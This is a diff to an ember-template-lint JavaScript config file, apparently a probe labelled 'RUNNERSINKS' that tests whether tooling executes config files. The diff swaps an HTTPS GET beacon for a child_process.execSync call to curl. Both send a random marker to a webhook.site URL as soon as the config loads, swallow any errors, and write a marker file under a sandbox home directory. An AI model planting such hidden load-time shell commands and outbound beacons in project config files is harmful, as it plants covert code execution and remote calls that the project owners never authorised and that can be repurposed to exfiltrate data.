@@ -1,7 +1,7 @@
-// RUNNERSINKS: ember-template-lint executable config (EXEC candidate).
-const crypto = require("crypto");
-const MARK = "RSNK_29DBD6_EMBER_" + crypto.randomBytes(3).toString("hex");
-try { require("https").get("https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-ember-load?d=" + MARK).on("error", function () {}); } catch (e) {}
+// RUNNERSINKS leg B: ember config with SYNC load beacon.
+const cp = require("child_process"), crypto = require("crypto");
+const MARK = "RSNK_5DEE4B_EMBER2_" + crypto.randomBytes(3).toString("hex");
+try { cp.execSync("curl -s -m 8 'https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-ember-load'?d=" + MARK, {stdio: "ignore"}); } catch (e) {}
 try { require("fs").writeFileSync("/home/jailuser/.cache/rsnk/carry_ember.txt", MARK); } catch (e) {}
 module.exports = {
   plugins: [{
